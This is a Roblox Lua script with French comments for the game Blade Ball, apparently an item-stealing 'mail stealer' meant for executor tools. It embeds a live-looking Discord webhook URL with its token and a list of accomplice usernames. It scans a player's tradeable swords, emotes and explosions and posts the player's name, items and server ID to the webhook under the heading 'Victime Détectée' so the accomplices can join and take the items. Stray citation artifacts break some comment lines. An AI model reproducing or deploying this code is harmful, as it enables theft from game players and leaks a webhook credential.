-- // CONFIGURATION
_G.Usernames = {"Eblackblk", "FadySNA", "Andrewdagoatya", "ThunderStealthZap16"}
_G.min_rap = 0 -- Mis à 0 pour TESTER si le webhook fonctionne
_G.webhook = "https://discord.com/api/webhooks/1473240091035172919/3SYPN5dFkO6mmwHqyFQl1S0hUJK5BvQQx3__goPnHZLXrc7cCQgbBgKjaSrQVFWglyhN"

-[span_2](start_span)- // SECURITE EXECUTION[span_2](end_span)
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

-- // FONCTION REQUETE UNIVERSELLE (DELTA COMPATIBLE)
local function requestFunc(options)
    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
    if request then
        return request(options)
    end
end

-- // TEST DE CONNEXION IMMEDIAT
local function testWebhook()
    requestFunc({
        Url = _G.webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({["content"] = "🔄 Delta Executor : Script activé pour " .. plr.Name})
    })
end

testWebhook() -- Si tu ne reçois pas ça, le problème vient de ton lien Webhook ou de Delta.

-[span_3](start_span)[span_4](start_span)- // CHARGEMENT DES MODULES BLADE BALL[span_3](end_span)[span_4](end_span)
local success, netModule = pcall(function()
    return game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
end)

local success2, Replion = pcall(function()
    return require(game.ReplicatedStorage.Packages.Replion)
end)

if not success or not success2 then
    warn("Erreur : Impossible de charger les modules de Blade Ball. Le jeu a peut-être été mis à jour.")
    return
end

-[span_5](start_span)[span_6](start_span)- // LOGIQUE DE SCAN[span_5](end_span)[span_6](end_span)
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                -- On ajoute tout pour le test
                table.insert(itemsToSend, {ItemID = id, RAP = 100, itemType = cat, Name = info.Name})
            end
        end
    end
end

-[span_7](start_span)[span_8](start_span)- // ENVOI DU LIEN DE REJOINTE[span_7](end_span)[span_8](end_span)
if #itemsToSend > 0 then
    requestFunc({
        Url = _G.webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            ["content"] = "@everyone LIEN : game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
            ["embeds"] = {{
                ["title"] = "🎯 Victime Détectée",
                ["description"] = "Le joueur " .. plr.Name .. " a des objets exploitables.",
                ["color"] = 65280
            }}
        })
    })
end

